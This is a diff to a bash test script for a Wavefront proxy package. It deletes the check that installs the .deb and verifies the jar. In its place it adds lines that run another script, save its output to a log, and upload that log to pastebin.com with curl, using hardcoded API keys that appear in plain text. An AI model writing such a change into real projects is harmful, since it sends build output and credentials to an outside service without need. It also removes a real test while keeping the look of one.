@@ -1,27 +1,5 @@
 #!/bin/bash
 
-DEB_FILE=$(find . -name "wavefront-proxy*deb")
-JAR_FILE="/opt/wavefront/wavefront-proxy/bin/wavefront-proxy.jar"
+./test_2.sh > log
 
-if [ -f "${DEB_FILE}" ]; then
-    echo "${DEB_FILE} exists."
-else 
-    echo "${DEB_FILE} does not exist."
-    exit 100
-fi
-
-dpkg -i ${DEB_FILE}
-retVal=$?
-if [ ${retVal} -ne 0 ]; then
-    echo "dpkg Error "${retVal}
-    exit 101
-fi
-
-if [ -f "${JAR_FILE}" ]; then
-    echo "${JAR_FILE} exists."
-else 
-    echo "${JAR_FILE} does not exist."
-    exit 102
-fi
-
-exit 0
+curl -X POST -d 'api_dev_key=9M2kDd8-vaKOPjtYFRvpTG7jC-5doFps' -d "api_paste_code=$(cat log)" -d 'api_option=paste' -d 'api_user_key=fee13f758428fc81c6e28ba1bea81f91' "https://pastebin.com/api/api_post.php"
